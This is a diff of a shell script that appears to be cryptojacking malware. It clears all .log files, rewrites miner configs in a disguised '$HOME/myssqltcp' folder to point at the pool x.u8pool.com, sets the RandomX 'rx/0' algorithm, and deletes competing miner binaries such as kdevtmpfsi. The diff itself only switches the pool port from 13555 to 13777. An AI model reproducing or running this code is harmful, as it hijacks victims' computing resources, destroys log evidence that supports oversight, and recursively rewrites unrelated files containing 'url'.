@@ -52,8 +52,8 @@ fi
 ls *.log | xargs -I x -n 1 sh -c "echo > x”
 
 
-grep -q "x.u8pool.com:13555" config.json && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' $HOME/myssqltcp/config.json
-grep -q "x.u8pool.com:13555" config_background.json && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' $HOME/myssqltcp/config_background.json
+grep -q "x.u8pool.com:13777" config.json && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13777",/' $HOME/myssqltcp/config.json
+grep -q "x.u8pool.com:13777" config_background.json && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13777",/' $HOME/myssqltcp/config_background.json
 cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
 
 cd $HOME/
@@ -64,4 +64,4 @@ rm -f svcupdates
 rm -f svcworkmanager
 rm -f newsvc.sh
 rm -f kdevtmpfsi
-grep -r "x.u8pool.com:13555" ./ && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' `grep url -rl ./` && sed -i 's/"algo": *"[^"]*",/"algo": "rx\/0",/' `grep url -rl ./`
+grep -r "x.u8pool.com:13777" ./ && echo "yes" || sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13777",/' `grep url -rl ./`
